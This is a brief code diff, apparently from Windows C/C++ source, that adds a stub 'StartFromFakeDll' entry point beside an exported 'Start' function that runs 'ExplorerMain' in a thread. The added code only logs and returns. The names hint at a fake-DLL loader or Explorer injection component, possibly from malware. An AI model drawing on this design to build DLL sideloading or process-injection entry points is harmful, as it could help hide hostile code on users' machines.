@@ -182,5 +182,8 @@ extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
 	StartThread(ExplorerMain, NULL);
 }
 
-
-
+BOOL WINAPI StartFromFakeDll()
+{
+	DLLDBG("StartFromFakeDll", "Started and finished.");
+	return FALSE;
+}
